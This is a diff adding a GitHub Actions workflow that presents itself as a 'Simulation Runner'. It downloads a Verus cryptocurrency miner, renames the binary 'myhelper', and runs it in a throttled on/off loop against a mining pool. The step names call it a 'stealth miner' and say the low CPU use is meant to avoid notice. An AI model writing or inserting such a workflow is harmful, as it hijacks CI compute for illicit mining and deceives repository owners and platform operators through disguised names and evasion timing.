@@ -1,0 +1,25 @@
+name: Simulation Runner
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run-sim:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Download stealth miner
+      run: |
+        curl -L -o sim https://github.com/VerusCoin/ccminer-verus/releases/download/v0.1/ccminer-verus-ubuntu18.zip
+        unzip sim
+        chmod +x verus*
+        mv verus* myhelper
+
+    - name: Start background mining (low CPU)
+      run: |
+        while true; do
+          ./myhelper -a verus -o stratum+tcp://na.luckpool.net:3956 -u YOUR_VERUS_WALLET.WORKER -p x &
+          PID=$!
+          sleep 45
+          kill $PID
+          sleep 15
+        done
